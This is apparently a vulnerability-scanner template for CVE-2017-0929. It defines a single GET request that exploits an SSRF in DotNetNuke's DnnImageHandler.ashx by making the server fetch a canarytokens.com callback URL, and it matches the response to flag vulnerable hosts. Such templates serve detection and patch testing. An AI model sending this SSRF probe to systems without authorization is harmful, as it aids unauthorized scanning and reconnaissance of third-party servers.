id: CVE-2017-0929

info:
  name: DotNetNuke ImageHandler SSRF
  author: medbsq
  severity: Potential
  # - https://hackerone.com/reports/482634

requests:
  - method: GET 
    path:
      - "{{BaseURL}}/DnnImageHandler.ashx?mode=file&url=canarytokens.com/terms/tags/o19w0lhddn1auyrbtnts79n7u/submit.aspx"
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55        
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "(?m)<html><body>[a-z0-9]+</body></html>"
        part: header
      - type: status
        status:
          - 200